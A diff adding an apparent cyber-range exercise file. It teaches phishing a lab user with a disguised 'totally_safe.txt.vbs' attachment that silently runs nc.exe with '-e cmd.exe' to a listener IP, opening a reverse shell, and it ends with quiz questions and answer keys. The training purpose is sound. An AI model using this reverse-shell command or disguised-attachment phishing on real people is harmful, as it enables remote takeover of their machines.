@@ -1,0 +1,47 @@
+<?xml version="1.0"?>
+<exercises>
+  <exercise>
+    <title>Netcat Exercise</title>
+    <difficulty>1</difficulty>
+    <category>CNE</category>
+    <name>netcat</name>
+    <dependencies></dependencies>
+    <shortdescription>Use phishing and netcat to backdoor a target.</shortdescription>
+    <description>This exercise is meant to teach users how to phish and gain a remote shell using malware.</description>
+    <tutorial>&lt;ol&gt;&#xD;
+&lt;li&gt;Open a netcat listner on your kali box on a random high port of your choice.&lt;/li&gt;&#xD;
+&lt;li&gt;Copy the following file to your desktop y_resources/nc_downloader/totally_safe.txt.vbs&lt;/li&gt;&#xD;
+&lt;li&gt;Right click and edit the file on your desktop.&lt;/li&gt;&#xD;
+&lt;li&gt;At the bottom of the script, you will see nc.exe syntax pointing to the IP of 192.20.128.11 with port 80 CHANGE THE PORT NUMBER TO THE RANDOM HIGH PORT YOU CHOSE IN STEP 1 Example: Change shell. Run "C:\Users\Public\Pictures\nc.exe 192.20.128.11 80 -e cmd.exe", 0 , false - To shell.Run "C:\Users\Public\Pictures\nc.exe 192.20.128.11 RHP -e cmd.exe", 0 , false --Where RHP is the port you chose in step 1.&lt;/li&gt;&#xD;
+&lt;li&gt;Save the script.&lt;/li&gt;&#xD;
+&lt;li&gt;Send enticing email to your defense network user defender#@gmail.local, attach the totallysafe.txt.vbs from desktop.&lt;/li&gt;&#xD;
+&lt;li&gt;Defense network user opens attachment and you now have a shell as well as netcat stored locally.&lt;/li&gt;&#xD;
+&lt;li&gt;Hack&lt;/li&gt;&#xD;
+&lt;/ol&gt;</tutorial>
+    <video>https://www.youtube.com/embed/UMx4aKaAV2E</video>
+    <question>
+      <text>What switch options did you use to open a listener using netcat?</text>
+      <type>multiple</type>
+      <answer>-l -v -p</answer>
+      <wrong>-c -x -v</wrong>
+      <wrong>nc -l -v -p 80</wrong>
+      <wrong>switch on and switch off</wrong>
+    </question>
+    <question>
+      <text>What does RHP stand for?</text>
+      <type>multiple</type>
+      <answer>Random High Port</answer>
+      <wrong>Neil DeGrasse Tyson</wrong>
+      <wrong>Random Helper Port</wrong>
+      <wrong>Remote Helper Port</wrong>
+    </question>
+    <question>
+      <text>What is the IP address 192.20.128.11 attached to?</text>
+      <type>multiple</type>
+      <answer>The Kali Linux box</answer>
+      <wrong>The target workstation</wrong>
+      <wrong>Your attacker workstation</wrong>
+      <wrong>The malicious webserver</wrong>
+    </question>
+  </exercise>
+</exercises>
